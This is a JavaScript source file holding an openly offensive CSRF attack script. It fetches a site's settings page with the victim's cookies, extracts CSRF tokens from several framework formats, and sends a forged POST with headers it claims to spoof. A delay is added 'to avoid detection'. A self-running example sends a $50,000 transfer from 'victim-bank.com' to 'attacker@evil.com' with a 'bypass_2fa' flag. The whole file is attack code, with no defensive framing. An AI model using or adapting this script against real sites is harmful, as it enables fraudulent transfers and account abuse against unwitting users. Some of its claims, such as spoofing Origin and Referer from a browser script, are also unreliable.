/**
 * Advanced CSRF Attack with Dynamic Token Extraction
 * This attack first fetches the target page to extract CSRF tokens,
 * then uses them to perform authenticated actions
 */
class AdvancedCSRFAttack {
    constructor(targetDomain, victimEndpoint) {
        this.targetDomain = targetDomain;
        this.victimEndpoint = victimEndpoint;
        this.extractedTokens = new Map();
    }

    /**
     * Step 1: Extract CSRF tokens from target page
     * Uses fetch with credentials to maintain session context
     */
    async extractCSRFTokens() {
        try {
            // Fetch the form page that contains CSRF tokens
            const response = await fetch(`${this.targetDomain}/account/settings`, {
                method: 'GET',
                credentials: 'include', // Critical: includes victim's session cookies
                mode: 'cors', // Allow cross-origin if CORS misconfigured
                headers: {
                    'User-Agent': 'Mozilla/5.0 (compatible; legitimate browser)',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
            });

            const htmlContent = await response.text();
            
            // Parse HTML to extract various types of CSRF tokens
            const parser = new DOMParser();
            const doc = parser.parseFromString(htmlContent, 'text/html');
            
            // Extract meta tag CSRF token (Laravel style)
            const metaToken = doc.querySelector('meta[name="csrf-token"]');
            if (metaToken) {
                this.extractedTokens.set('meta-token', metaToken.getAttribute('content'));
            }
            
            // Extract hidden form field CSRF token (Django/Rails style)
            const hiddenToken = doc.querySelector('input[name="csrfmiddlewaretoken"], input[name="authenticity_token"]');
            if (hiddenToken) {
                this.extractedTokens.set('form-token', hiddenToken.value);
            }
            
            // Extract custom header token from JavaScript variables
            const scriptMatch = htmlContent.match(/window\.csrfToken\s*=\s*["']([^"']+)["']/);
            if (scriptMatch) {
                this.extractedTokens.set('js-token', scriptMatch[1]);
            }

            console.log('Extracted tokens:', this.extractedTokens);
            return this.extractedTokens.size > 0;
            
        } catch (error) {
            console.error('Token extraction failed:', error);
            return false;
        }
    }

    /**
     * Step 2: Execute privileged action using extracted tokens
     * Supports multiple token formats and API endpoints
     */
    async executePrivilegedAction(actionData) {
        const headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest', // Bypass simple CSRF checks
            'Origin': this.targetDomain, // Spoof origin header
            'Referer': `${this.targetDomain}/account/settings` // Spoof referer
        };

        // Add extracted CSRF tokens to appropriate headers
        if (this.extractedTokens.has('meta-token')) {
            headers['X-CSRF-Token'] = this.extractedTokens.get('meta-token');
        }
        if (this.extractedTokens.has('js-token')) {
            headers['X-CSRFToken'] = this.extractedTokens.get('js-token');
        }

        // Prepare request body with form token if available
        const requestBody = { ...actionData };
        if (this.extractedTokens.has('form-token')) {
            requestBody.csrfmiddlewaretoken = this.extractedTokens.get('form-token');
        }

        try {
            const response = await fetch(`${this.targetDomain}${this.victimEndpoint}`, {
                method: 'POST',
                credentials: 'include', // Include victim's authentication cookies
                headers: headers,
                body: JSON.stringify(requestBody)
            });

            if (response.ok) {
                console.log('CSRF attack successful:', await response.json());
                return true;
            } else {
                console.error('CSRF attack failed:', response.status, response.statusText);
                return false;
            }
        } catch (error) {
            console.error('Request execution failed:', error);
            return false;
        }
    }

    /**
     * Step 3: Execute complete attack chain
     */
    async executeAttack(maliciousData) {
        console.log('Initiating advanced CSRF attack...');
        
        // First extract tokens
        const tokensExtracted = await this.extractCSRFTokens();
        if (!tokensExtracted) {
            console.error('Failed to extract CSRF tokens');
            return false;
        }

        // Wait brief moment to avoid detection
        await new Promise(resolve => setTimeout(resolve, 100));

        // Execute the malicious action
        return await this.executePrivilegedAction(maliciousData);
    }
}

/**
 * Attack execution example
 */
(async function() {
    const attack = new AdvancedCSRFAttack('https://victim-bank.com', '/api/transfer');
    
    const maliciousTransfer = {
        recipient: 'attacker@evil.com',
        amount: 50000,
        description: 'Legitimate transfer', // Social engineering
        bypass_2fa: true // If API is poorly designed
    };

    await attack.executeAttack(maliciousTransfer);
})();
